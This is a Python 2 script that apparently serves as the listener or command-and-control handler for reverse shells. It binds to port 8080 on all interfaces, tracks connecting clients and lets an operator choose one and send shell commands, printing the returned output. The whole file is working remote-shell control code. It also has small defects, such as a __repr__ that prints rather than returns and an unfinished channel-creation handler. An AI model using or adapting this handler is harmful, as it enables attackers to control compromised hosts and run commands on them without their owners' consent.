import socket
import Queue
import subprocess
import os
import threading
import logging
import time
import psutil
import sys

logging.basicConfig(filename='handler.log',level=logging.DEBUG, format="%(asctime)s %(levelname)s in %(funcName)s: %(message)s")

class StoppableThread(threading.Thread):
	"""
	Thread that can be stopped by an external force.
	"""
	def __init__(self, target, args=()):
		super(StoppableThread, self).__init__(target=target, args=args)
		self._stop = threading.Event()
		
	def stop(self):
		self._stop.set()
		
	def stopped(self):
		return self._stop.isSet()
	
class Channel:
	"""
	Channels are used to split data into streams.
	"""
	def __init__(self, id, master_queue):
		self.id = id
		
		self.input_queue = Queue.Queue()
		self.output_queue = master_queue
		
		logging.debug("Channel created with ID "+str(ord(id)))

	def write_input(self, data): # This function is used to feed data into a channel.
		logging.debug("Data written into channel #"+str(ord(self.id))+" input: "+data.strip())
		self.input_queue.put(data)
		
	def read_input(self, blocking=True): # This function is used to read data from a channel.
		try:
			data = self.input_queue.get(blocking)
			logging.debug("Data read from channel #"+str(ord(self.id))+" input: "+data.strip())
			return data
		except Queue.Empty: return None
		
	def write_output(self, data): # This function is used to send data to the handler.
		logging.debug("Data written into channel #"+str(ord(self.id))+" output: "+data.strip())
		self.output_queue.put(self.id+data)
		
	def __repr__(self):
		print "Channel ID: "+str(ord(id))
	
class Transport:
	""""
	Used to transfer data between the handler and a client.
	"""
	def __init__(self, sock, addr, port, id):
		self.client_id = id
		self.address = addr
		self.port = port
		
		self.comm_socket = sock
		
		self.master_queue = Queue.Queue() # Data that has to be sent is put on this queue.
		self.user_channel = Channel(chr(97), self.master_queue) # Channel for user input and shell output.
		self.signal_channel = Channel(chr(254), self.master_queue) # Channel used for signalling: Requesting new channels, etc.
		
		self.channels = {chr(97):self.user_channel, chr(254):self.signal_channel}
		
		self.disconnected = False
		
		for f in [self.sender_loop, self.receiver_loop, self.signal_processor]:
			t = StoppableThread(target=f)
			t.daemon = True
			t.start()
			
		logging.debug("Created new transport for client #"+str(self.client_id))
		
	def send(self, data):
		self.comm_socket.sendall(data)
		
	def recv(self):
		if self.disconnected: return ""
		try: data = self.comm_socket.recv(4096)
		except: data = ""
		if not data:
			self.comm_socket.close()
			logging.error("Client #"+str(self.client_id)+" disconnected")
			self.disconnected = True
			return self.user_channel.id+"CONN_LOST"
		return data
		
	def sender_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.master_queue.get()
			self.send(data)
			logging.debug("Sent data to client #"+str(self.client_id)+": "+data[1:])
			
	def receiver_loop(self):
		ct = threading.currentThread()
		while not ct.stopped() and not self.disconnected:
			data = self.recv()
			try:
				identifier, data = data[0], data[1:]
				logging.debug("Received data from client #"+str(self.client_id)+": "+data.strip())
				self.channels[identifier].write_input(data)
			except Exception as e:
				try: logging.warn("Received data with invalid identifier "+str(ord(identifier))+": "+data.strip())
				except: logging.critical("Something went very, very wrong.")
				
	def signal_processor(self):
		ct = threading.currentThread()
		while not ct.stopped():
			signal = self.signal_channel.read_input()
			if signal == "CREATE_CHANNEL":
				pass
				
	def create_channel(self, id):
		self.channels[id] = Channel(id, self.master_queue)
		
class Client:
	"""
	Represents a connected client.
	"""
	def __init__(self, id, cli, ip, port):
		self.transport = Transport(cli, ip, port, id)
		self.id = id
		
	def send(self, data):
		self.transport.user_channel.write_output(data)
		
	def recv(self):
		return self.transport.user_channel.read_input()
	
	def interact(self):
		logging.info("Starting interaction with client #"+str(self.id))
		self.send("cd .")
		cwd = self.recv()
		sys.stdout.write(cwd)
		
		while True:
			user_input = raw_input()
			logging.debug("Got user input: "+user_input)
			self.send(user_input)
			
			data = self.recv()
			logging.debug("Result of user input: "+data)
			if data == "CONN_LOST": os._exit(1)
			sys.stdout.write(data)
		
class Handler:
	"""
	Main handler class. Sets up a socket for clients to connect to.
	"""
	def __init__(self, bind_addr, bind_port):
		self.sock = socket.socket()
		self.sock.bind((bind_addr, bind_port))
		self.sock.listen(5)
	
		self.clients = []
		
	def accepter(self):
		ct = threading.currentThread()
		while not ct.stopped():
			cli, addr = self.sock.accept()
			ip, port = addr
			
			client = Client(len(self.clients), cli, ip, port)
			self.clients.append(client)
			print "new client!"
		
	def run(self):
		t = StoppableThread(target=self.accepter)
		t.daemon = True
		t.start()
		while True:
			user_input = raw_input("prompt>")
			if user_input == "l": print self.clients
			elif user_input.startswith("i"):
				the_chosen_one = self.clients[int(user_input.split()[1])]
				the_chosen_one.interact()
		
Handler("0.0.0.0",8080).run()